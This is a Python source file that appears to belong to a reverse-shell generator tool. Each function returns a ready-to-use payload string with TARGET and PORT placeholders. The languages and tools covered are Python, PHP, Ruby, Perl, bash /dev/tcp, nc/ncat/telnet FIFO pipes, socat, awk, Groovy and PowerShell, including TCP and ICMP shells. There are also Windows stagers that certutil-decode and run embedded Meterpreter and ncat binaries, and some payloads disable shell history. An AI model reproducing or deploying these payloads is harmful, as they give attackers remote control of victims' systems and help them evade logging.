#!/usr/bin/env python
from binary import WINDOWS_NCAT, WINDOWS_SHARPCODE, binary_to_bat, shellcode_to_ps1
from classes import generate_file_name


def REV_PYTHON_TCP():
    return """python -c \"import os;import pty;import socket;VAR1='TARGET';VAR2=PORT;VAR3=socket.socket(socket.AF_INET,socket.SOCK_STREAM);VAR3.connect((VAR1,VAR2));os.dup2(VAR3.fileno(),0);os.dup2(VAR3.fileno(),1);os.dup2(VAR3.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn('/bin/bash');VAR3.close();\" """


def REV_PYTHON_UDP():
    return """python -c \"import os;import pty;import socket;VAR1='TARGET';VAR2=PORT;VAR3=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);VAR3.connect((VAR1, VAR2)); os.dup2(VAR3.fileno(),0);os.dup2(VAR3.fileno(),1);os.dup2(VAR3.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn('/bin/bash');VAR3.close();\" """


def REV_PHP_TCP():
    return r"""php -r "\$sock=fsockopen('TARGET',PORT);exec('/bin/sh -i <&3 >&3 2>&3');" """


def REV_RUBY_TCP():
    return """ruby -rsocket -e "exit if fork;c=TCPSocket.new('TARGET','PORT');while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end" """


def REV_PERL_TCP():
    return r"""perl -e "use Socket;\$i='TARGET';\$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};" """


def REV_PERL_TCP_2():
    return r"""perl -MIO -e "\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,'TARGET:PORT');STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;" """


def REV_PERL_UDP():
    return """perl -e 'use IO::Socket::INET;$|=1;my ($s,$r);my ($pa,$pp);$s=new IO::Socket::INET->new();$s = new IO::Socket::INET(PeerAddr => "TARGET:PORT",Proto => "udp"); $s->send("SHELLPOP PWNED!\n");while(1) { $s->recv($r,1024);$pa=$s->peerhost();$pp=$s->peerport();$d=qx($r);$s->send($d);}'"""


def BASH_TCP():
    return """/bin/bash -i >& /dev/tcp/TARGET/PORT 0>&1"""


def REV_POWERSHELL_TCP():
    return """powershell.exe -nop -ep bypass -Command "$ip='TARGET';$port=PORT;$client = New-Object System.Net.Sockets.TCPClient($ip, $port);$stream=$client.GetStream();[byte[]]$bytes = 0..65535|%{0};$sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ');$stream.Write($sendbytes,0,$sendbytes.Length);while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $returndata = ([text.encoding]::ASCII).GetString($bytes, 0, $i); try { $result = (Invoke-Expression -c $returndata 2>&1 | Out-String ) } catch { Write-Warning 'Something went wrong with execution of command on the target.'; Write-Error $_; }; $sendback = $result +  'PS ' + (Get-Location).Path + '> '; $x = ($error[0] | Out-String); $error.clear(); $sendback = $sendback + $x; $sendbytes = ([text.encoding]::ASCII).GetBytes($sendback); $stream.Write($sendbytes, 0, $sendbytes.Length); $stream.Flush();}; $client.Close(); if ($listener) { $listener.Stop(); };" """


def REVERSE_TCLSH():
    return """echo 'set s [socket TARGET PORT];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh"""


def REVERSE_NCAT():
    return "ncat TARGET PORT -e /bin/bash"


def REVERSE_NC_TRADITIONAL_1():
    return "nc TARGET PORT -c /bin/bash"


def REVERSE_NC_UDP_1():
    return """mkfifo fifo ; nc.traditional -u TARGET PORT < fifo | { bash -i; } > fifo"""


def REVERSE_MKFIFO_NC():
    return "if [ -e /tmp/f ]; then rm /tmp/f;fi;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc TARGET PORT > /tmp/f"


def REVERSE_MKNOD_NC():
    return "if [ -e /tmp/f ]; then rm -f /tmp/f;fi;mknod /tmp/f p && nc TARGET PORT 0</tmp/f|/bin/bash 1>/tmp/f"


def REVERSE_MKFIFO_TELNET():
    return "if [ -e /tmp/f ]; then rm /tmp/f;fi;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet TARGET PORT > /tmp/f"


def REVERSE_MKNOD_TELNET():
    return "if [ -e /tmp/f ]; then rm /tmp/f;fi;mknod /tmp/f p && telnet TARGET PORT 0</tmp/f|/bin/bash 1>/tmp/f"


def REVERSE_SOCAT():
    return """socat tcp-connect:TARGET:PORT exec:"bash -li",pty,stderr,setsid,sigint,sane"""


def REVERSE_AWK():
    return """awk 'BEGIN {s = "/inet/tcp/0/TARGET/PORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null"""


def REVERSE_AWK_UDP():
    return """awk 'BEGIN {s = "/inet/udp/0/TARGET/PORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null"""


def REVERSE_WINDOWS_BAT2METERPRETER_TCP():
    file_out = generate_file_name()
    return """{0}\ncertutil -decode %Temp%\\{1}.b64 %Temp%\\{1}.exe\n%Temp%\\{1}.exe """.format(
        binary_to_bat(WINDOWS_SHARPCODE, file="%Temp%\\{0}.b64".format(file_out)), file_out)


def REVERSE_WINDOWS_NCAT_TCP():
    nc_out = generate_file_name()
    return """{0}\ncertutil -decode %Temp%\\{1}.b64 %Temp%\\{1}.exe\n%Temp%\\{1}.exe -e cmd.exe TARGET PORT\ndel %Temp%\\{1}.exe\n""".format(
        binary_to_bat(WINDOWS_NCAT, file="%Temp%\\{0}.b64".format(nc_out)), nc_out)


def REVERSE_WINDOWS_BLOODSEEKER_TCP():
    return """ Custom Shell requires a Custom code. """


def REVERSE_POWERSHELL_TINY_TCP():
    return """powershell.exe -nop -ep bypass -Command "$c=new-object system.net.sockets.tcpclient('TARGET',PORT);$s=$c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|out-string);$z=$o + 'PS' + (pwd).Path + '>';$x = ([text.encoding]::ASCII).GetBytes($z);$s.Write($x,0,$x.Length);$s.Flush};$c.close()" """


def REVERSE_POWERSHELL_NISHANG_TCP():
    return """function Invoke-PowerShellTcp 
{ 
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
Invoke-PowerShellTcp -Reverse -IPAddress TARGET -Port PORT"""


def REVERSE_GROOVY_TCP():
    return """groovysh -e 'String host="TARGET";int port=PORT;String cmd="cmd.exe";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();'"""


def REVERSE_POWERSHELL_ICMP():
    return """function Invoke-PowerShellIcmp
{ 
<#PORT#>           
    [CmdletBinding()] Param(

        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $false)]
        [Int]
        $Delay = 5,

        [Parameter(Position = 2, Mandatory = $false)]
        [Int]
        $BufferSize = 128

    )
    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
    $PingOptions.DontFragment = $True
    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
    while ($true)
    {
        $sendbytes = ([text.encoding]::ASCII).GetBytes('')
        $reply = $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions)
        if ($reply.Buffer)
        {
            $response = ([text.encoding]::ASCII).GetString($reply.Buffer)
            $result = (Invoke-Expression -Command $response 2>&1 | Out-String )
            $sendbytes = ([text.encoding]::ASCII).GetBytes($result)
            $index = [math]::floor($sendbytes.length/$BufferSize)
            $i = 0
            if ($sendbytes.length -gt $BufferSize)
            {
                while ($i -lt $index )
                {
                    $sendbytes2 = $sendbytes[($i*$BufferSize)..(($i+1)*$BufferSize)]
                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
                    $i +=1
                }
                $remainingindex = $sendbytes.Length % $BufferSize
                if ($remainingindex -ne 0)
                {
                    $sendbytes2 = $sendbytes[($i*$BufferSize)..($sendbytes.Length)]
                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
                }
            }
            else
            {
                $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes, $PingOptions) | Out-Null
            }
            $sendbytes = ([text.encoding]::ASCII).GetBytes("`nPS " + (Get-Location).Path + '> ')
            $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
        }
        else
        {
            Start-Sleep -Seconds $Delay
        }
    }
}
Invoke-PowerShellIcmp -IPAddress TARGET"""
